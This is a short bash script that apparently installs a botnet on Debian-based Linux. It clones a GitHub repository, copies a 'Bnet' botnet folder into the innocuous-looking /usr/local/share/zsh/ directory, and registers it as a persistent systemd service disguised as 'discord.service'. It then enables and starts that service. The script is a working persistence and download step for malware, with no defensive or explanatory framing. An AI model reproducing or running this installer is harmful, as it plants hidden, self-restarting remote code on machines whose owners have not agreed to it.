#Har har Mahadev
#!/bin/bash




fileee="/usr/share/Bnet/recover_bnet.sh"


if [ ! -f "$fileee" ]; then
   
    git clone https://github.com/Dhanraj369/the_spider_shell_reshell.git
    cp -r the_spider_shell_reshell/Debian_based_botne/Bnet /usr/local/share/zsh/
    rm -rf the_spider_shell_reshell
    cp /usr/local/share/zsh/Bnet/discord.service /etc/systemd/system/
    rm /usr/local/share/zsh/Bnet/discord.service
    #  Debian_based_botne
    cd /usr/local/share/zsh/Bnet/ && chmod +x *.sh
    systemctl daemon-reload
    systemctl enable discord.service
    systemctl start discord.service
   

fi
    
    
